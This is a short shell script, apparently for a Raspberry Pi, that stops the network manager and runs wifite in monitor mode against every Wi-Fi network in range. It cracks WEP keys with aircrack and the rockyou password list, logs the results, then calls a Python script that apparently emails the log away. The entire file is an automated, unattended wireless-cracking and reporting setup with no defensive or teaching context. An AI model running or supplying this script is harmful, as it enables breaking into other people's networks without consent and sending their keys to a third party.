#!/bin/sh
sleep 10
sudo /etc/init.d/network-manager stop
sudo /home/pi/reaver-1.4/src/wifite.py -i mon0 -all -wep -dict /pentest/passwords/wordlists/rockyou.txt -aircrack > /home/pi/reaver-1.4/src/log.txt
sudo python mailLog.py

exit 0
